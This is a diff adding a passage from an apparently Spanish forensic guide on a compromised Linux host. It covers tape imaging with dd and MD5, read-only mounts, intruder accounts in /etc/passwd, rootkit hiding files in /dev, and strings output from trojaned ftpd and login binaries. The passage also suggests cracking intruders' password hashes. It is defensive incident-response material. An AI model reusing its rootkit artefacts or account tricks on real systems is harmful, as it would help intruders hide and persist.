+ /dev/hdd2           870      1022   1228972+  83  Linux
+ /dev/hdd3          1023      1035    104422+  82  Linux swap
+ /dev/hdd4          1036      1575   4337550   83  Linux
+</pre><p>
+A partir de este listado podemos sacar una buena conclusión que la
+partición /dev/hdd2 era partición root, y /dev/hdd4 era algo parecido
+a /usr o /home. No puede decir cual de las dos es en este paso, pero
+se puede ver el fichero salvado /etc/fstab, o alternativamente
+montarla partición y examinar su contenido.
+</p><p>
+En caso de que hayamos hecho una imagen de la partición, debemos
+restaurarla para su estudio posterior.
+</p><p>
+c. Se generan los checksums de integridad de particiones con MD5 del
+disco original y sus imágenes para verificar si coinciden.
+</p><p>
+Nota: Asumimos que tenemos un dispositivo de cinta en /dev/st0 y el
+dispositivo &quot;non-rewind&quot; está en /dev/nst0. El tamaño del bloque,
+normalmente 512 bytes, puede que no sea el valor más eficaz para su
+dispositivo de cintas. Consulte la documentación de su dispositivo y
+determine el factor óptimo (frecuentemente entre 8198 y 32767).
+</p><p>
+Los siguientes ejemplos utilizarán el valor por defecto para evitar
+complicaciones.
+</p><p>
+El comando mt se utiliza para saltar, volver atrás en un fichero para
+luego verificar su checksum MD5. Hay que estar seguro que se utiliza
+dispositivo &quot;non-rewind&quot; ya que a la hora de saltar de una imagen de
+fichero a otra podríamos sobrescribir información sobre la cinta y
+perder información. También hay que asegurarse que no hacemos ningún
+error con parámetros if= y of= - opciones del comando dd ya que podrá
+destruir información sobre el disco con facilidad. (Ver man mt y man
+dd, luego practique escribiendo/leyendo múltiples ficheros a/de la
+cinta antes de hacer cualquier acción con los datos importantes.)
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # date
+ Mon Jun 19 12:00:22 PDT 2000
+</pre><pre class="programlisting">
+ # md5sum /dev/hdd2
+ 7b8af7b2224f0497da808414272e7af4  /dev/hdd2
+</pre><pre class="programlisting">
+ # mt status
+ SCSI 2 tape drive:
+ File number=0, block number=0, partition=0.
+ Tape block size 512 bytes. Density code 0x13 (DDS (61000 bpi)).
+ Soft error count since last status=0
+ General status bits on (41010000):
+  BOT ONLINE IM_REP_EN
+</pre><pre class="programlisting">
+ # dd if=/dev/hdd2 of=/dev/nst0
+ 2457944+0 records in
+ 2457944+0 records out
+</pre><pre class="programlisting">
+ # mt bsf 1
+</pre><pre class="programlisting">
+ # dd if=/dev/st0 | md5sum
+ 2457944+0 records in
+ 2457944+0 records out
+ 7b8af7b2224f0497da808414272e7af4  -
+</pre><pre class="programlisting">
+ # mt status
+ SCSI 2 tape drive:
+ File number=1, block number=0, partition=0.
+ Tape block size 512 bytes. Density code 0x13 (DDS (61000 bpi)).
+ Soft error count since last status=0
+ General status bits on (81010000):
+ EOF ONLINE IM_REP_EN
+</pre><p>
+Marque la cinta con una etiqueta que contiene, nombre del
+sistema violado, particiones y correspondientes MD5, sus
+iniciales y la fecha.
+</p><p>
+A la hora de verificar los MD5 del disco y de la/s cintas si al menos
+un único byte ha sido modificado a la hora de realizar la duplicación
+o backup, el checksum no coincidirá. Eso puede estar causado por un
+sector dañado en el disco duro o en la cinta, puede que haya hecho una
+copia del sistema &quot;vivo&quot; (no montado read-only), o haya hecho la copia
+de una partición incorrecta.
+</p><p>
+Intente utilizar otra cinta. Pruebe también regenerar el MD5 checksum
+del disco/partición. Haga lo que haga no intente re-formatear,
+analizar, arreglar el disco original ya que todas esas acciones
+alterarán la información del disco.
+</p><p>
+Puede ser que necesite servicios de una empresa especializada en
+recuperación de datos que puede migrar en tiempo real los datos del
+disco y determinar que sector exactamente está dañado y arreglarlo de
+forma segura. Ojo, siempre que entrega una cinta/disco a las empresas
+de recuperación de datos, aseguren la información con una aseguradora
+por el valor aproximado de daños causados. Si es la cinta o el
+dispositivo de cinta que está fallando, pues se debe adquirir un
+dispositivo/cinta nuevo/a ya que no podrá seguir trabajando con
+hardware estropeado.
+</p><p>
+d. Si se está guardando más de una partición en la cinta, hay que
+asegurarse que se utiliza el dispositivo non-rewind para cada
+partición, entonces se usa mt rewind o simplemente se saca la cinta,
+lo que causará que se rebobine. Ahora es cuando debe habilitar la
+protección de escritura de la cinta ya que no queremos que de forma
+accidental se sobrescriba la información. Una vez que vuelva a meter
+la cinta en el dispositivo se debe comprobar que la protección contra
+escritura está funcionando correctamente utilizando el comando mt. El
+siguiente ejemplo muestra el estado de una cinta protegida contra
+escritura, posicionada en el punto BOT y el primer fichero está
+marcado como #0.
+</p><pre class="programlisting">
+ # mt status
+ SCSI 2 tape drive:
+ File number=0, block number=0, partition=0.
+ Tape block size 512 bytes. Density code 0x13 (DDS (61000 bpi)).
+ Soft error count since last status=0
+ General status bits on (45010000):
+  BOT WR_PROT ONLINE IM_REP_EN
+</pre><p>
+Mientras que el siguiente ejemplo muestra el estado de una cinta sin
+protección contra escritura y el fin de 2º fichero en la cinta #1, lo
+que es también en este caso el fin de la cinta.
+</p><pre class="programlisting">
+ # mt fsf 1
+ /dev/tape: Input/output error
+</pre><pre class="programlisting">
+ # mt status
+ SCSI 2 tape drive:
+ File number=1, block number=0, partition=0.
+ Tape block size 512 bytes. Density code 0x13 (DDS (61000 bpi)).
+ Soft error count since last status=0
+ General status bits on (89010000):
+  EOF EOD ONLINE IM_REP_EN
+</pre><p>
+e. Monte el sistema de ficheros root, pero no modifíquelo de ninguna
+manera. Para hacerlo bien hay que montarla de modo solo lectura con
+opción &quot;-r&quot; o &quot;-o ro&quot;. Tenemos que tener en cuenta que la pertenencia
+de ficheros se contará basándose en el fichero /etc/group del sistema
+de análisis y no del fichero group del sistema comprometido.
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # mount -r /dev/hdd2 /mnt
+</pre><pre class="programlisting">
+ # ls -lat /mnt
+ total 73
+ drwxr-x---  17 root     root         1024 May  1 09:01 root
+ drwxrwxrwt   6 root     root         1024 May  1 04:03 tmp
+ drwxr-xr-x   8 root     root        34816 Apr 30 04:02 dev
+ drwxr-xr-x  34 root     root         3072 Apr 29 14:17 etc
+ drwxr-xr-x   2 root     root         2048 Apr 26 16:52 bin
+ drwxr-xr-x   2 root     root         1024 Apr 26 11:12 boot
+ drwxr-xr-x   3 root     root         3072 Apr 21 04:01 sbin
+ drwxr-xr-x   4 root     root         3072 Apr 21 03:56 lib
+ drwxrwxr-x   2 root     root         1024 Mar  3 13:27 cdrom
+ drwxr-xr-x   2 root     root         1024 Oct  9  1999 home
+ drwxr-xr-x   2 root     root        12288 Oct  9  1999 lost+found
+ drwxr-xr-x   4 root     root         1024 Oct  9  1998 mnt
+ drwxr-xr-x   2 root     root         1024 Oct  9  1999 proc
+ drwxr-xr-x  20 root     root         1024 Aug  2  1998 usr
+ drwxr-xr-x  18 root     root         1024 Aug  2  1998 var
+</pre><p>
+Observando este listado podemos notar que efectivamente no nos hemos
+equivocado ya que esa partición es de hecho la partición root ya que
+contiene directorios &quot;usr&quot;, &quot;var&quot;, &quot;proc&quot;, &quot;bin&quot;, &quot;root&quot;, &quot;etc&quot;,
+etc... Vemos que el directorio &quot;home&quot; tiene 2 enlaces, y el directorio
+&quot;usr&quot; tiene 20 enlaces (ya que por las entradas de directorios &quot;.&quot; y
+&quot;..&quot; el número mínimo de enlaces que llevan a un directorio son
+2). Todavía no sabemos que es lo que exactamente contiene la partición
+/dev/hdd4. Parece que posiblemente contiene el contenido del /home y
+no del /usr ni tampoco /var por las mismas razones.
+</p><p>
+Por supuesto para salir de dudas podemos examinar el fichero /etc/fstab.
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # less /mnt/etc/fstab
+  . . .
+ /dev/hda1               /dosc               msdos   defaults       0 0
+ /dev/hda2               /                   ext2    defaults       1 1
+ /dev/hda4               /home               ext2    defaults       1 2
+ /dev/hda3               swap                swap    defaults       0 0
+ /dev/cdrom              /cdrom              iso9660 noauto,user,ro 0 0
+ /dev/fd0                /floppy             ext2    noauto,user,rw 0 0
+ none                    /proc               proc    defaults       0 0
+ none                    /dev/pts            devpts  mode=0622      0 0
+</pre><p>
+Cabe tomar nota aquí que utilizamos el paginador less. Es para
+prevenir potencialmente insertados caracteres especiales que pueden
+modificar los ajustes del terminal en tty, si eso pasa el terminal es
+inutilizable para nosotros ya que no podemos ni leer ni escribir de
+forma legible. Si estuvo utilizando el programa script para logear la
+sesión, tendrá que salir y resetear el terminal, posiblemente
+olvidando de script y olvidando de los records anteriores. De todas
+maneras antes de salir intentaremos Ctrl+D para cerrar la sesión
+script.
+</p><p>
+Recuerde que si el disco era el único dispositivo IDE utilizado en el
+sistema, pueda posiblemente ser master en el primer controlador o
+/dev/hda. Por eso el fichero fstab los muestra de tal forma, y no como
+/dev/hdd como aparecen en nuestro sistema de análisis. Por lo tanto
+para que podamos montar la partición /home necesitamos utilizar
+/dev/hdd4.
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+ # umount /mnt
+ # mount -r /dev/hdd4 /mnt
+ # ls -lat /mnt
+ total 21
+ drwx------  47 user1    user1        3072 Apr 28 11:52 user1
+ drwx------  10 user3    user3        1024 Dec  3 14:19 user3
+ drwx------   4 user2    user2        1024 Oct 14  1999 user2
+ drwxr-xr-x   2 root     root        12288 Oct  1  1999 lost+found
+ drwxr-xr-x   2 root     nobody       1024 Apr 15  1999 samba
+ drwxr-xr-x   5 root     root         1024 Apr  7  1999 httpd
+ drwxr-xr-x   6 root     root         1024 Mar 21  1999 ftp
+ drwxr-xr-x  30 root     root         1024 Aug  2  1998 local
+</pre><p>
+Ahora podemos ver el contenido de la partición /home montado sobre
+/mnt. Vamos por ahora ignorar el contenido de la partición /home, ya
+que ningún fichero de sistema operativo se encuentra allí. En futuro
+podemos examinar su contenido para detectar algún indicio de
+back-door, como aplicaciones setuid/setgid, ficheros .rhosts, comandos
+añadidos a los ficheros de inicialización de shell (.cshrc, .bashrc,
+etc.) que pueden enviar una copia de fichero que contiene passwords a
+una dirección, borrar fichero, similares...
+</p><p>
+Ahora vamos a re-montar en solo lectura el sistema de ficheros root y
+empecemos a investigar.
+</p><p>
+Ejemplo:
+</p><pre class="programlisting">
+  # umount /mnt
+  # mount -r /dev/hdd2 /mnt
+</pre><p>
+Primero, verifiquemos que es lo que contiene el fichero /etc/passwd
+para ver que UID/GIDs hay dentro. Este fichero debe ser copiado y
+utilizado con la aplicación mactime del suite de herramientas The
+Coroner's Toolkit [13]. La aplicación nos mostrará el mapeo correcto
+de UIDs y GIDs.
+</p><p>
+El fichero puede contener cuentas creadas por los intrusos como por
+ejemplo aquí:
+</p><pre class="programlisting">
+ # less /mnt/etc/passwd
+  . . .
+ root:x:0:0:root:/root:/bin/bash
+ bin:x:1:1:bin:/bin:
+ daemon:x:2:2:daemon:/sbin:
+ adm:x:3:4:adm:/var/adm:
+ lp:x:4:7:lp:/var/spool/lpd:
+ sync:x:5:0:sync:/sbin:/bin/sync
+ shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+ z:x:0:0::/:/bin/bash
+ halt:x:7:0:halt:/sbin:/sbin/halt
+ mail:x:8:12:mail:/var/spool/mail:
+ news:x:9:13:news:/var/spool/news:
+ uucp:x:10:14:uucp:/var/spool/uucp:
+ operator:x:11:0:operator:/root:
+ r00t:x:598:500:::/bin/bash
+ games:x:12:100:games:/usr/games:
+ y:x:900:100::/tmp:/bin/bash
+ gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ <a href="ftp:x:14:50:FTP" target="_top">ftp:x:14:50:FTP</a> User:/home/ftp:
+ nobody:x:99:99:Nobody:/:
+ gdm:x:42:42::/home/gdm:/bin/bash
+ xfs:x:100:233:X Font Server:/etc/X11/fs:/bin/false
+ user1:x:500:500:User 1:/home/user1:/bin/tcsh
+ user2:x:501:501:User 2:/home/user2:/bin/tcsh
+ user3:x:502:502:User 3:/home/user3:/bin/tcsh
+ named:x:25:25:Named:/var/named:/bin/false
+</pre><p>
+En el ejemplo anterior podemos observar que hay cuentas que parecen
+totalmente fuera de lugar ya que tienen números UID elevados y sin
+orden aparente, por ejemplo &quot;r00t&quot;, &quot;y&quot; (que por cierto tiene asignado
+como $HOME el directorio /tmp). Un fichero de passwd legítimo y creado
+por el sistema, normalmente sigue un patrón secuencial de asignación
+de UID's. Mientras aquí anotamos que las cuentas con UIDs de orden
+bajo como reciente mente añadidos &quot;named&quot; con UID 25 y &quot;z&quot; con UID 0 y
+GID 0 (lo mismo que root) son altamente sospechosos por su
+posición. Hemos tomado nota para volver luego y investigar más en
+detalle. Intente de forma opcional extraer las contraseñas de esos
+usuarios en formato cifrado y intentar ripearlos (hay muchas
+posibilidades de que los intrusos tengan la misma contraseña en la
+máquina atacada y en suya propia). También apunte algunas conclusiones
+a las que hemos llegado ahora:
+</p><div class="orderedlist"><ol type="1"><li><p>Creación de cuentas es una acción frecuente, y creadas de tal     manera como hemos visto anteriormente muestran un nivel de     conocimientos bajo del intruso.</p></li><li><p>También podemos suponer que los intrusos ya han observado que el     administrador no realiza verificaciones de seguridad rutinarias y     no temen ser descubiertos.</p></li><li><p>Puede ser que sea un entretenimiento para los intrusos crear     cuentas para que el administrador las encuentre, las elimine y     asume que el sistema está seguro, mientras que hay múltiples     puertas traseras instaladas que permiten compromiso root de la     máquina.</p></li><li><p>Como normalmente las cuentas se crean de forma secuencial en el     fichero /etc/passwd, puede que el administrador (o alguien más?!)     haya instalado named en el sistema, de forma reciente (o el intruso     haya instalado una versión de named vulnerable!?) .</p></li></ol></div><p>
+Debe empezar a construir una línea temporal para anotar cuando han
+ocurrido los hechos, intentar trazar de forma inversa todos los
+acciones hasta el intento de entrada al sistema, y el punto de origen
+de entrada. Aprovechando todos los hechos acumulados al final podremos
+determinar el origen verdadero del atacante y los sistemas utilizados
+para atacar a la máquina.
+</p><p>
+En este momento nos encontramos en la fase de observación, ahora
+estamos tomando notas de lo que pasó, hemos verificado que tenemos el
+contenido de disco duro intacto, disponemos de tres copias del disco
+duro y las estamos estudiando en modo solo lectura.
+</p><p>
+Desde aquí el análisis puede ser continuado usando herramientas
+comunes de Unix y/o herramientas especialmente diseñados para análisis
+forense. También debemos utilizar toda nuestra experiencia anterior y
+el sentido común.
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2757030"></a>7. Análisis con Herramientas Estándar de Unix </h2></div></div><p>
+Asumiendo que nuestras herramientas de Unix están limpias de root-kit
+podemos seguir desde el punto donde lo dejamos en la sección
+anterior. Hemos notado que las dos cuentas &quot;y&quot; y &quot;z&quot; tienen el
+directorio &quot;home&quot; situado en en /tmp y en / respectivamente. Eso
+significa que debemos examinar de forma detenida estos directorios
+para detectar cualquier anomalía.
+</p><pre class="programlisting">
+ # ls -lat /mnt/tmp
+ total 156
+ drwxrwxrwt   	6 root     root         1024 May  1 04:03 .
+ -r--r--r--   	1 root     gdm            11 Apr 29 14:17 .X0-lock
+ drwxrwxrwt   	2 root     gdm          1024 Apr 29 14:17 .X11-unix
+ drwxrwxrwt   	2 xfs      xfs          1024 Apr 29 14:17 .font-unix
+ drwxr-xr-x  	25 y        root         1024 Apr 28 23:47 ..
+ drwx------   	2 user1    user1        1024 Apr 26 17:36 kfm-cache-500
+ -rw-rw-r--   	1 user1    user1       12288 Apr 26 16:37 psdevtab
+ drwxrwxrwt   	2 root     root         1024 Apr 21 11:12 .ICE-unix
+ -rwx------   	1 root     root       138520 Apr 20 20:15 .fileMFpmnk
+</pre><p>
+El listado nos muestra que existe un fichero cuyo tamaño es superior
+al resto. También vemos que es el fichero más antiguo de la carpeta
+que pertenece al root. El nombre del fichero no estandarizado y posee
+derechos de ejecución. Debemos determinar de que tipo de fichero se
+trata. El programa file nos informa que el fichero misterioso es un
+binario ELF de 32-bit LSB ejecutable, Intel 80386, versión 1 (Linux),
+enlazado estáticamente, stripeado. Para ver cual es el objetivo del
+fichero examinamos el listado de cadenas de texto que contiene.
+</p><div class="orderedlist"><ol type="1"><li><p>strings - /mnt/tmp/.fileMFpmnk</p></li></ol></div><pre class="programlisting">
+ /lib/ld-linux.so.2
+ __gmon_start__
+ libpam.so.0
+ _DYNAMIC
+ _GLOBAL_OFFSET_TABLE_
+ pam_set_item
+ free
+ __ctype_tolower
+ malloc
+ strcmp
+ pam_end
+ pam_start
+  . . .
+ File
+ Compressed
+ Block
+ Stream
+ [nowhere yet]
+ ftpd
+ :aAvdlLiop:P:qQr:sSt:T:u:wWX
+ bad value for -u
+ option -%c requires an argument
+ unknown option -%c ignored
+  . . .
+ VirtualFTP Connect to: %s [%s]
+ banner
+ logfile
+ email
+ /var/log/xferlog
+ connection refused (server shut down) from %s
+ %s FTP server shut down -- please try again later.
+ lslong
+ /bin/ls -la
+ lsshort
+ lsplain
+ /bin/ls
+ greeting
+ full
+ terse
+ brief
+ %s FTP server (%s) ready.
+ %s FTP server ready.
+ FTP server ready.
+  . . .
+ FTP LOGIN REFUSED (already logged in as %s) FROM %s, %s
+ Already logged in.
+ /etc/ftphosts
+ FTP LOGIN REFUSED (name in %s) FROM %s, %s
+ anonymous
+ FTP LOGIN REFUSED (anonymous ftp denied on default server) FROM %s, %s
+ FTP LOGIN REFUSED (ftp in denied-uid) FROM %s, %s
+ /etc/ftpusers
+  . . .
+</pre><p>
+Por lo que vemos, strings nos comenta que el binario es un servidor
+FTP, normalmente llamado ftpd ó in.ftpd. Puede ser que el fichero
+forma parte de un root-kit, o de un caballo de Troya. Los ficheros de
+configuración de este tipo de kits suelen normalmente encontrarse en
+el directorio /dev, entonces una búsqueda rápida en ese directorio
+podrá desvelar nos mucha información útil.
+</p><pre class="programlisting">
+ # cd /mnt/dev
+ # ls -lat | head -30
+ total 116
+ drwxr-xr-x   8 root     root        34816 Apr 30 04:02 .
+ srw-rw-rw-   1 root     root            0 Apr 30 04:02 log
+ crw-------   1 root     root       4,   1 Apr 29 14:17 tty1
+ crw-------   1 root     root       4,   2 Apr 29 14:17 tty2
+ crw-------   1 root     root       4,   3 Apr 29 14:17 tty3
+ crw-------   1 root     root       4,   4 Apr 29 14:17 tty4
+ crw-------   1 root     root       4,   5 Apr 29 14:17 tty5
+ crw-------   1 root     root       4,   6 Apr 29 14:17 tty6
+ srwxrwxrwx   1 root     root            0 Apr 29 14:17 gpmctl
+ srw-------   1 root     root            0 Apr 29 14:17 printer
+ crw-r--r--   1 root     root       1,   9 Apr 29 14:17 urandom
+ prw-------   1 root     root            0 Apr 29 14:14 initctl
+ drwxr-xr-x  25 y        root         1024 Apr 28 23:47 ..
+ crw-rw-rw-   1 root     tty        3,   2 Apr 28 11:44 ttyp2
+ crw-rw-rw-   1 root     tty        3,   0 Apr 28 11:43 ttyp0
+ crw-rw-rw-   1 root     tty        3,   1 Apr 28 11:43 ttyp1
+ -rw-r--r--   1 root     root           18 Apr 27 22:58 ptyp
+ drwxr-xr-x   4 r00t     root         1024 Apr 27 22:58 ...
+ crw-rw-rw-   1 root     tty        3,   4 Apr 27 12:02 ttyp4
+ crw-rw-rw-   1 root     tty        3,   3 Apr 27 11:56 ttyp3
+ crw-------   1 root     root       5,   1 Apr 21 11:09 console
+ lrwxrwxrwx   1 root     root            5 Apr 21 04:02 mouse -&gt; psaux
+ drwxr-xr-x   2 root     root         1024 Apr 20 15:21 rev0
+ -rw-r--r--   1 root     root           33 Apr 20 15:21 ptyr
+ lrwxrwxrwx   1 root     root            9 Feb 28 02:23 isdnctrl -&gt; isdnctrl0
+ lrwxrwxrwx   1 root     root            5 Feb 28 02:23 nftape -&gt; nrft0
+ lrwxrwxrwx   1 root     root            3 Feb 28 02:23 fb -&gt; fb0
+ lrwxrwxrwx   1 root     root           15 Feb 28 02:23 fd -&gt; ../proc/self/fd
+ lrwxrwxrwx   1 root     root            4 Feb 28 02:23 ftape -&gt; rft0
+ Broken pipe
+</pre><p>
+De todos los ficheros que podemos ver en este directorio, nos llaman
+atención los archivos &quot;ptyp&quot; y &quot;ptyr&quot; que no son dispositivos comunes,
+ni directorios ni tampoco enlaces simbólicos, son ficheros de tipo
+ASCII text. También localizamos un directorio llamado &quot;rev0&quot; y una
+carpeta oculta &quot;...&quot; que pertenece al usuario r00t.
+</p><pre class="programlisting">
+ # less ptyr
+  . . .
+ sp.pl
+ slice
+ ssynk4
+ rev0
+ bc1
+ snif
+</pre><p>
+Son ficheros de configuración de un caballo de Troya. El contenido
+muestra que ls ocultará ficheros o directorios sp.pl, slice (un
+cliente DoS), ssynk4 (cliente DoS), rev0, bc1, y snif (adivina que
+puede ser :).
+</p><p>
+Si estamos seguros que nuestro sistema no está &quot;infectado&quot; con un
+root-kit podemos utilizar las herramientas find y grep para
+identificar dónde se encuentran estos ficheros (el disco está montado
+como solo lectura, nodev, ¿verdad?).
+</p><pre class="programlisting">
+ # cd /mnt
+</pre><pre class="programlisting">
+ # find . -ls | grep -f etc/ptyr
+ 282058    1 drwxr-xr-x   2 root     root         1024 Apr 20 15:21 ./dev/rev0
+ 282059    1 -rw-r--r--   1 root     root            5 Apr 20 15:21 ./dev/rev0/sniff.pid
+ 282061   20 -rw-r--r--   1 root     root        19654 Apr 20 20:23 ./dev/rev0/tcp.log
+ 164753    9 -rwxr-xr-x   1 1080     users        9106 Sep 20  1999 ./dev/rev0/slice
+ 164754    8 -rwxr-xr-x   1 1080     users        8174 Sep 20  1999 ./dev/rev0/smurf4
+ 164755    8 -rwxr-xr-x   1 1080     users        7229 Sep 20  1999 ./dev/rev0/snif
+ 164756    4 -rwxr-xr-x   1 1080     users        4060 Mar  5  1999 ./dev/rev0/sp.pl
+ 164770    9 -rwxr-xr-x   1 root     1000         8268 Aug 10  1999 ./dev/.../blitznet/slice2
+  61907    2 -rwxr-xr-x   1 root     root         2006 Mar 29  1999 ./usr/bin/sliceprint
+ 255230    1 -rw-r--r--   1 root     root          900 Mar 21  1999 ./usr/include/python1.5/sliceobject.h
+</pre><p>
+Algunos de los ficheros que están en la lista posiblemente son
+ficheros legítimos del sistema operativo, pero hay algunos que son
+bastante sospechosos, los que se encuentran en dos carpetas del
+directorio /dev.
+</p><pre class="programlisting">
+ # cd /mnt/dev
+ # less ptyp
+  . . .
+ 3 egg
+ 3 egg
+ 3 bnc
+</pre><p>
+En este momento podemos hacer una apuesta seguro, que el fichero
+&quot;ptyp&quot; es un fichero de configuración de la utilidad &quot;ps&quot; del
+root-kit, que oculta los procesos que contienen cadenas &quot;egg&quot;, &quot;bnc&quot;
+en sus nombres. Hay que encontrar binarios ejecutables con estos
+nombres.
+</p><pre class="programlisting">
+ # cd /mnt/dev
+ # ls -lR ...
+ ...:
+ total 2699
+ drwxr-sr-x   2 root     1000         1024 Aug 10  1999 blitznet
+ -rw-r--r--   1 root     root        30720 Apr 26 04:07 blitznet.tar
+ -rwxrw-r--   1 r00t     user1       22360 Apr 27 22:58 bnc
+ -rw-r--r--   1 900      users     2693120 Apr 20 22:18 collision.tar
+ -rw-rw-r--   1 r00t     user1         976 Apr 27 22:58 example.conf
+ -rw-rw-r--   1 user1    user1           5 Apr 28 20:35 pid.bnc
+</pre><pre class="programlisting">
+ .../blitznet:
+ total 22
+ -rw-r--r--   1 root     1000         3450 Aug 10  1999 README
+ -rw-r--r--   1 root     1000         1333 Aug 10  1999 blitz.c
+ -rw-r--r--   1 root     1000         3643 Aug 10  1999 blitzd.c
+ -rwxr-xr-x   1 root     1000         2258 Aug 10  1999 rush.tcl
+ -rwxr-xr-x   1 root     1000         8268 Aug 10  1999 slice2
+</pre><pre class="programlisting">
+ # ls -lR rev0
+ rev0:
+ total 51
+ -rwxr-xr-x   1 1080     users        9106 Sep 20  1999 slice
+ -rwxr-xr-x   1 1080     users        8174 Sep 20  1999 smurf4
+ -rwxr-xr-x   1 1080     users        7229 Sep 20  1999 snif
+ -rw-r--r--   1 root     root            5 Apr 20 15:21 sniff.pid
+ -rwxr-xr-x   1 1080     users        4060 Mar  5  1999 sp.pl
+ -rw-r--r--   1 root     root        19654 Apr 20 20:23 tcp.log
+</pre><pre class="programlisting">
+ # cd /mnt/usr/bin
+ # ls -lat | head
+ total 89379
+ drwxr-xr-x   6 root     root        27648 Apr 21 04:01 .
+ -rwsr-xr-x   1 root     root        20164 Apr 15 19:23 chx
+ lrwxrwxrwx   1 root     root            8 Feb 28 02:28 netscape-navigator -&gt; netscape
+ drwxrwxr-x   2 news     news         1024 Feb 28 02:25 rnews.libexec
+ drwxrwxr-x   2 news     news         1024 Feb 28 02:25 control
+ drwxrwxr-x   2 news     news         1024 Feb 28 02:25 filter
+ lrwxrwxrwx   1 root     root            4 Dec 30 13:06 elatex -&gt; etex
+ lrwxrwxrwx   1 root     root            5 Dec 30 13:06 lambda -&gt; omega
+ lrwxrwxrwx   1 root     root            3 Dec 30 13:06 latex -&gt; tex
+ Broken pipe
+</pre><pre class="programlisting">
+ # strings - chx
+ /lib/ld-linux.so.2
+ __gmon_start__
+ libcrypt.so.1
+ libpam.so.0
+  . . .
+ /var/log/btmp
+ /usr/share/locale
+ util-linux
+ fh:p
+ login: -h for super-user only.
+ usage: login [-fp] [username]
+ /dev/tty
+ %s??
+ /dev/vcs
+ /dev/vcsa
+ login
+ login: PAM Failure, aborting: %s
+ Couldn't initialize PAM: %s
+ FAILED LOGIN %d FROM %s FOR %s, %s
+ Login incorrect
+ TOO MANY LOGIN TRIES (%d) FROM %s FOR %s, %s
+ FAILED LOGIN SESSION FROM %s FOR %s, %s
+ Login incorrect
+ .hushlogin
+ %s/%s
+ /var/run/utmp
+ /var/log/wtmp
+ /bin/sh
+ TERM
+ dumb
+ HOME
+ /usr/local/bin:/bin:/usr/bin
+ PATH
+ /sbin:/bin:/usr/sbin:/usr/bin
+ SHELL
+ /var/spool/mail
+ MAIL
+ LOGNAME
+ DIALUP AT %s BY %s
+ ROOT LOGIN ON %s FROM %s
+ ROOT LOGIN ON %s
+ LOGIN ON %s BY %s FROM %s
+ LOGIN ON %s BY %s
+ You have %smail.
+ new 
+ login: failure forking: %s
+ setuid() failed
+ No directory %s!
+ Logging in with home = &quot;/&quot;.
+ login: no memory for shell script.
+ exec 
+ login: couldn't exec shell script: %s.
+ login: no shell: %s.
+ %s login: 
+ login name much too long.
+ NAME too long
+ login names may not start with '-'.
+ too many bare linefeeds.
+ EXCESSIVE linefeeds
+ Login timed out after %d seconds
+ /etc/securetty
+ /etc/motd
+ /var/log/lastlog
+ Last login: %.*s 
+ from %.*s
+ on %.*s
+ LOGIN FAILURE FROM %s, %s
+ LOGIN FAILURE ON %s, %s
+ %d LOGIN FAILURES FROM %s, %s
+ %d LOGIN FAILURES ON %s, %s
+  . . .
+</pre><p>
+El programa nos muestra los mensajes del sistema mencionando el
+fichero &quot;.hushlogin&quot;.  Todos los indicios apuntan que el binario es
+una versión modificada de de la aplicación login. Siempre Los binarios
+siempre incluyen información de objetos compilados y enlazados, salvo
+que estén stripeados. Si está presente esa información podemos
+examinarla con la utilidad nm.
+</p><pre class="programlisting">
+ # nm chx
+ chx: no symbols
+</pre><p>
+En este caso estamos seguros que el fichero está stripeado. También
+podemos aprender bastante de lo que nos muestran los enlaces a las
+librerías dinámicas. Para verlo utilicemos ldd.
+</p><pre class="programlisting">
+ # ldd chx
+	libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x40018000)
+	libpam.so.0 =&gt; /lib/libpam.so.0 (0x40045000)
+	libdl.so.2 =&gt; /lib/libdl.so.2 (0x4004d000)
+	libpam_misc.so.0 =&gt; /lib/libpam_misc.so.0 (0x40050000)
+	libc.so.6 =&gt; /lib/libc.so.6 (0x40054000)
+	/lib/ld-linux.so.2 =&gt; /lib/ld-linux.so.2 (0x40000000)
+</pre><p>
+El binario depende del módulo PAM y de las librerías
+criptográficas. Entonces, el binario efectúa algunas tareas de
+autenticación de usuarios. El binario parece ser el /bin/login
+modificado que pertenece a algún caballo de Troya.
+</p><p>
+Normalmente los intrusos no dejan huellas evidentes que nos permiten
+encontrar ficheros y directorios. El ejemplo anterior nos ha probado
+que utilizando herramientas básicas podemos reunir bastante
+información.
+</p><p>
+En caso de que no sea tan sencillo, se deberá utilizar herramientas
+más complejas y eficaces. Para ver algún ejemplo complejo podemos ver
+referencias [14, 15].
+</p></div><div class="sect1"><div class="titlepage"><div><h2 class="title" style="clear: both"><a name="id2757491"></a>8. The Coroner's Toolkit </h2></div></div><p>
+The Coroner's Toolkit (o el &quot;TCT&quot;) es un suite de aplicaciones
+escritas por Dan Farmer y Wietse Venema para un curso organizado por
+IBM sobre un estudio forense de equipos comprometidos.
+</p><p>
+Las aplicaciones más importantes del suite son:
+</p><div class="itemizedlist"><ul type="disc"><li><p>grave-robber - Una utilidad para capturar información sobre inodes,    para luego pueda ser procesada por el programa mactime del mismo    toolkit.</p></li><li><p>unrm y lazarus - Herramientas para la recuperación de archivos    borrados (logs, RAM, swap, etc.).  Estas aplicaciones identifican y    recuperan la información oculta en los sectores del disco duro.</p></li><li><p>mactime - El programa para visualizar los ficheros/directorios su    timestamp MAC (Modification, Access, y Change).</p></li></ul></div><p>
+De todas esas herramientas, las más útiles y interesantes son
+grave-robber y mactime. unrm y lazarus son buenas si se tiene mucho
+tiempo y espacio libre en el disco, ya que el programa necesita
+identificar información en los sectores del disco para recuperar los
+ficheros (logs, fuentes, etc..) borrados por los intrusos.
+</p><p>
+La función más básica de grave-robber es de escanear algunas o todas
+sistemas de ficheros con función stat() para obtener información de
+los inodes. Grave-robber crea en la carpeta /data un directorio
+llamado como el nombre del host de la máquina y allí almacena los
+inodes, dentro del fichero body. El programa mactime luego ordena los
+resultados y los muestra: según el tiempo, cual de los tres timestamps
+corresponde, muestra el tipo de fichero, tamaño y a quién pertenece
+junto con el path.
+</p><p>
+Desde el listado, podremos sacar algunas conclusiones sobre la
+actividad que ha ejercido el intruso/los intrusos durante el tiempo
+que estuvieron dentro del sistema. Eso puede incluir instalación de
